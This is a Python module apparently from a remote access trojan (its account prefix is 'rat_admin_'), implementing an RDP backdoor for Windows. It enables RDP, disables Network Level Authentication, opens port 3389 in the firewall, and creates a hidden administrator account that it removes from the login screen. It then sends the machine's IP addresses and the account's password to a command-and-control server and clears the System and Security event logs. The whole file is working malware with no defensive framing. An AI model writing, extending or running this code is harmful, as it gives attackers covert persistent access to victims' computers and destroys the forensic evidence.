import logging
import os
import json
import socket
import subprocess
import uuid
import winreg
import requests
import ctypes
import time
import string
import random
from config import Config
from encryption.manager import EncryptionManager
from subprocess import run
from typing import Dict, Optional

class RDPController:
    def __init__(self, encryption_manager: EncryptionManager):
        self.encryption = encryption_manager
        self.username = f"rat_admin_{uuid.uuid4().hex[:8]}"
        # Generate a strong password compliant with Windows policies
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        self.password = ''.join(random.choice(chars) for _ in range(16))
        if Config.DEBUG_MODE:
            logging.info(f"RDPController initialized with username: {self.username}, password: {self.password}")

    def _is_admin(self) -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False

    def _user_exists(self, username: str) -> bool:
        try:
            result = run(
                ["net", "user", username],
                capture_output=True,
                text=True,
                check=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            logging.info(f"User check output for {username}: {result.stdout}")
            return result.returncode == 0
        except subprocess.CalledProcessError as e:
            logging.info(f"User {username} does not exist: {e.stderr}")
            return False

    def _is_user_in_group(self, username: str, group: str) -> bool:
        try:
            result = run(
                ["net", "localgroup", group],
                capture_output=True,
                text=True,
                check=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return username in result.stdout
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to check group membership for {group}: {e.stderr}")
            return False

    def _start_service(self, service_name: str) -> bool:
        try:
            result = run(
                ["sc", "query", service_name],
                capture_output=True,
                text=True,
                check=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if "RUNNING" not in result.stdout:
                logging.info(f"Starting service {service_name}...")
                run(
                    ["net", "start", service_name],
                    check=True,
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            logging.info(f"Service {service_name} is running")
            return True
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to start service {service_name}: {e.stderr}")
            return False

    def _restart_service(self, service_name: str) -> bool:
        try:
            logging.info(f"Restarting service {service_name}...")
            run(
                ["net", "stop", service_name],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            time.sleep(1)
            run(
                ["net", "start", service_name],
                check=True,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            logging.info(f"Service {service_name} restarted")
            return True
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to restart service {service_name}: {e.stderr}")
            return False

    def _create_user_powershell(self, username: str, password: str) -> bool:
        """Attempt to create user via PowerShell as a fallback."""
        try:
            ps_command = (
                f"New-LocalUser -Name '{username}' -Password (ConvertTo-SecureString '{password}' -AsPlainText -Force) "
                f"-FullName '{username}' -Description 'RDP Access User' -AccountNeverExpires; "
                f"Add-LocalGroupMember -Group 'Administrators' -Member '{username}' -ErrorAction SilentlyContinue; "
                f"Add-LocalGroupMember -Group 'Remote Desktop Users' -Member '{username}' -ErrorAction SilentlyContinue"
            )
            result = run(
                ["powershell", "-Command", ps_command],
                capture_output=True,
                text=True,
                check=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            logging.info(f"PowerShell user creation output: {result.stdout}")
            return True
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to create user via PowerShell: {e.stderr}")
            return False

    def _check_port_powershell(self, port: str) -> bool:
        """Check if a port is listening using PowerShell."""
        try:
            ps_command = f"Get-NetTCPConnection -LocalPort {port} -State Listen -ErrorAction SilentlyContinue"
            result = run(
                ["powershell", "-Command", ps_command],
                capture_output=True,
                text=True,
                check=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return bool(result.stdout.strip())
        except subprocess.CalledProcessError as e:
            logging.warning(f"PowerShell port check failed: {e.stderr}")
            return False

    def enable_rdp(self) -> Dict[str, any]:
        try:
            if not self._is_admin():
                logging.error("Admin privileges required to enable RDP")
                return {"status": "error", "message": "Admin privileges required"}

            if os.name != "nt":
                logging.error("This operation is only supported on Windows")
                return {"status": "error", "message": "Unsupported operating system"}

            # Check Windows version compatibility
            try:
                result = run(
                    ["systeminfo"],
                    capture_output=True,
                    text=True,
                    check=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                if "Home" in result.stdout:
                    logging.warning("Windows Home edition detected, RDP may not be supported")
            except Exception as e:
                logging.warning(f"Failed to check Windows version: {str(e)}")

            # Enable RDP in registry
            logging.info("Enabling RDP in registry...")
            try:
                # Main RDP setting
                reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(key, "fAllowToGetHelp", 0, winreg.REG_DWORD, 1)

                # Ensure RDP port is 3389
                reg_path_tcp = r"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path_tcp, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "PortNumber", 0, winreg.REG_DWORD, 3389)
                logging.info("RDP enabled in registry with port 3389")
            except Exception as e:
                logging.error(f"Failed to enable RDP in registry: {str(e)}")
                return {"status": "error", "message": f"Failed to enable RDP in registry: {str(e)}"}

            # Disable NLA
            logging.info("Disabling NLA for RDP...")
            try:
                run(
                    ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
                     "/v", "UserAuthentication", "/t", "REG_DWORD", "/d", "0", "/f"],
                    check=True,
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                logging.info("NLA disabled successfully")
            except subprocess.CalledProcessError as e:
                logging.warning(f"Failed to disable NLA: {e.stderr}")

            # Start and restart RDP services
            logging.info("Starting and restarting RDP services...")
            for service in ["TermService", "SessionEnv", "UmRdpService"]:
                if not self._start_service(service):
                    return {"status": "error", "message": f"Failed to start service {service}"}
                self._restart_service(service)  # Restart to ensure activation
            time.sleep(5)  # Wait for services to stabilize

            # Clean up duplicate firewall rules
            logging.info("Cleaning up duplicate RDP firewall rules...")
            try:
                run(
                    ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
                    check=True,
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                logging.info("Duplicate firewall rules cleared")
            except subprocess.CalledProcessError:
                logging.info("No duplicate firewall rules found")

            # Configure firewall for RDP
            logging.info("Configuring firewall for RDP...")
            try:
                result = run(
                    ["netsh", "advfirewall", "firewall", "add", "rule",
                     "name=Allow RDP", "dir=in", "action=allow",
                     "protocol=TCP", "localport=3389"],
                    check=True,
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                logging.info(f"Firewall configuration output: {result.stdout}")
            except subprocess.CalledProcessError as e:
                logging.error(f"Failed to configure firewall: {e.stderr}")
                return {"status": "error", "message": f"Failed to configure firewall: {str(e)}"}

            # Create hidden user
            if self._user_exists(self.username):
                logging.warning(f"User {self.username} already exists, resetting password...")
                try:
                    run(
                        ["net", "user", self.username, self.password],
                        check=True,
                        capture_output=True,
                        text=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    logging.info(f"Password reset for user {self.username}")
                except subprocess.CalledProcessError as e:
                    logging.error(f"Failed to reset user password: {e.stderr}")
                    return {"status": "error", "message": f"Failed to reset user password: {e.stderr}"}
            else:
                logging.info(f"Creating hidden user: {self.username} with password: {self.password}")
                user_created = False
                # Try net user first
                try:
                    result = run(
                        ["net", "user", self.username, self.password, "/add"],
                        capture_output=True,
                        text=True,
                        check=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    logging.info(f"User creation output: {result.stdout}")
                    user_created = True
                except subprocess.CalledProcessError as e:
                    logging.warning(f"Failed to create user via net user: {e.stderr}")

                # Fallback to PowerShell
                if not user_created and not self._create_user_powershell(self.username, self.password):
                    logging.error("Failed to create user via PowerShell")
                    return {"status": "error", "message": f"Failed to create user: {e.stderr or 'Unknown error'}"}

                # Add to groups if not already a member
                try:
                    for group in ["Administrators", "Remote Desktop Users"]:
                        if not self._is_user_in_group(self.username, group):
                            result = run(
                                ["net", "localgroup", group, self.username, "/add"],
                                check=True,
                                capture_output=True,
                                text=True,
                                creationflags=subprocess.CREATE_NO_WINDOW
                            )
                            logging.info(f"Added {self.username} to {group}: {result.stdout}")
                        else:
                            logging.info(f"User {self.username} is already a member of {group}")
                    result = run(
                        ["net", "user", self.username, "/active:yes"],
                        check=True,
                        capture_output=True,
                        text=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    logging.info(f"User {self.username} activated")
                except subprocess.CalledProcessError as e:
                    if "1378" in e.stderr:  # Handle "already a member" error
                        logging.info(f"User {self.username} already in group, continuing...")
                    else:
                        logging.error(f"Failed to configure user permissions: {e.stderr}")
                        return {"status": "error", "message": f"Failed to configure user permissions: {str(e)}"}

                # Hide user
                try:
                    reg_path_user = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
                    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path_user) as key:
                        winreg.SetValueEx(key, self.username, 0, winreg.REG_DWORD, 0)
                    logging.info(f"User {self.username} hidden from login screen")
                except Exception as e:
                    logging.warning(f"Failed to hide user {self.username}: {e}")

            # Collect connection info
            logging.info("Collecting connection info...")
            info = self._get_connection_info()
            if not info:
                logging.error("Failed to get connection info")
                return {"status": "error", "message": "Failed to get connection info"}

            # Send RDP info to server
            logging.info("Sending RDP info to server...")
            if not self._send_to_server(info):
                logging.error("Failed to send RDP info to server")
                return {"status": "error", "message": "Failed to send RDP info to server"}

            self._cleanup_logs()

            # Verify RDP port
            logging.info("Verifying RDP port...")
            for attempt in range(3):
                try:
                    # Try netstat first
                    result = run(
                        ["netstat", "-an"],
                        capture_output=True,
                        text=True,
                        check=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    if "3389" in result.stdout and "LISTENING" in result.stdout:
                        logging.info("RDP port 3389 is active")
                        break

                    # Try PowerShell as fallback
                    if self._check_port_powershell("3389"):
                        logging.info("RDP port 3389 is active (PowerShell check)")
                        break

                    logging.warning(f"RDP port 3389 not listening (attempt {attempt+1})")
                    self._restart_service("TermService")  # Retry restarting service
                    time.sleep(5)  # Wait longer
                except subprocess.CalledProcessError as e:
                    logging.error(f"Failed to check RDP port: {e.stderr}")
                    return {"status": "error", "message": f"Failed to check RDP port: {str(e)}"}
            else:
                logging.error("RDP port 3389 is not listening after retries")
                return {"status": "error", "message": "RDP port 3389 is not listening after retries"}

            logging.info("RDP setup completed successfully")
            return {
                "status": "success",
                "message": "RDP enabled and configured successfully",
                "data": info
            }

        except Exception as e:
            logging.error(f"Failed to enable RDP: {str(e)}")
            return {"status": "error", "message": f"RDP enable failed: {str(e)}"}

    def disable_rdp(self) -> Dict[str, any]:
        try:
            if not self._is_admin():
                logging.error("Admin privileges required to disable RDP")
                return {"status": "error", "message": "Admin privileges required"}

            logging.info("Disabling RDP in registry...")
            try:
                reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
                logging.info("RDP disabled in registry")
            except Exception as e:
                logging.warning(f"Failed to disable RDP in registry: {str(e)}")

            logging.info("Stopping RDP services...")
            for service in ["TermService", "SessionEnv", "UmRdpService"]:
                try:
                    run(
                        ["net", "stop", service],
                        check=True,
                        capture_output=True,
                        text=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    logging.info(f"Service {service} stopped")
                except subprocess.CalledProcessError as e:
                    logging.warning(f"Failed to stop service {service}: {e.stderr}")

            logging.info("Removing firewall rules for RDP...")
            try:
                run(
                    ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
                    check=True,
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                logging.info("RDP firewall rule removed")
            except subprocess.CalledProcessError as e:
                logging.warning(f"Failed to remove firewall rule: {e.stderr}")

            if self._user_exists(self.username):
                logging.info(f"Removing hidden user: {self.username}...")
                try:
                    run(
                        ["net", "user", self.username, "/delete"],
                        check=True,
                        capture_output=True,
                        text=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    logging.info(f"User {self.username} deleted")
                except subprocess.CalledProcessError as e:
                    logging.warning(f"Failed to delete user {self.username}: {e.stderr}")

            logging.info("RDP disabled successfully")
            return {"status": "success", "message": "RDP disabled successfully"}

        except Exception as e:
            logging.error(f"Failed to disable RDP: {str(e)}")
            return {"status": "error", "message": f"Failed to disable RDP: {str(e)}"}

    def _get_connection_info(self) -> Optional[Dict]:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            public_ip = ""
            for url in [
                "https://api.ipify.org?format=json",
                "https://ipinfo.io/json",
                "https://ifconfig.me/ip",
            ]:
                try:
                    response = requests.get(url, timeout=5, verify=False)
                    if response.status_code == 200:
                        if url.endswith("format=json"):
                            public_ip = response.json().get("ip", "")
                        else:
                            public_ip = response.text.strip()
                        if public_ip:
                            break
                    logging.warning(f"Failed to get public IP from {url}: status={response.status_code}, response={response.text}")
                except Exception as e:
                    logging.warning(f"Failed to get public IP from {url}: {str(e)}")

            info = {
                "local_ip": local_ip,
                "public_ip": public_ip,
                "username": self.username,
                "password": self.password,
                "client_id": Config.get_client_id()
            }
            logging.info(f"Connection info: {info}")
            return info
        except Exception as e:
            logging.error(f"Failed to get connection info: {str(e)}")
            return None

    def _send_to_server(self, info: Dict) -> bool:
        try:
            encrypted_info = self.encryption.encrypt(json.dumps(info))
            payload = {
                "action": "report_rdp",
                "client_id": info["client_id"],
                "rdp_info": encrypted_info,
                "token": Config.SECRET_TOKEN
            }
            headers = {
                "X-Secret-Token": str(Config.SECRET_TOKEN),
                "Content-Type": "application/json"
            }
            logging.info(f"Sending payload to server: {payload}")

            for attempt in range(3):
                try:
                    response = requests.post(
                        Config.SERVER_URL,
                        json=payload,
                        headers=headers,
                        timeout=15
                    )
                    logging.info(f"Response status: {response.status_code}, text: {response.text[:200]}")
                    if response.status_code == 200:
                        logging.info("Successfully sent RDP info to server")
                        return True
                    logging.error(f"Server responded with status {response.status_code}: {response.text}")
                except requests.exceptions.SSLError as ssl_err:
                    logging.warning(f"SSL error (attempt {attempt+1}): {ssl_err}. Retrying without SSL verification...")
                    try:
                        response = requests.post(
                            Config.SERVER_URL,
                            json=payload,
                            headers=headers,
                            timeout=15,
                            verify=False
                        )
                        logging.info(f"Response status (no SSL verify): {response.status_code}, text: {response.text[:200]}")
                        if response.status_code == 200:
                            logging.info("Successfully sent RDP info to server (no SSL verify)")
                            return True
                        logging.error(f"Server responded with status {response.status_code} (no SSL verify): {response.text}")
                    except requests.exceptions.RequestException as e:
                        logging.error(f"Server send error (no SSL verify, attempt {attempt+1}): {str(e)}")
                except requests.exceptions.RequestException as e:
                    logging.error(f"Server send error (attempt {attempt+1}): {str(e)}")
                time.sleep(1)  # Wait before retrying
            logging.error("Failed to send RDP info after retries")
            return False
        except Exception as e:
            logging.error(f"Failed to send to server: {str(e)}")
            return False

    def _cleanup_logs(self) -> bool:
        try:
            for log in ["System", "Security"]:
                run(
                    ["wevtutil", "cl", log],
                    check=True,
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                logging.info(f"Cleared log: {log}")
            return True
        except Exception as e:
            logging.error(f"Failed to clean up logs: {str(e)}")
            return False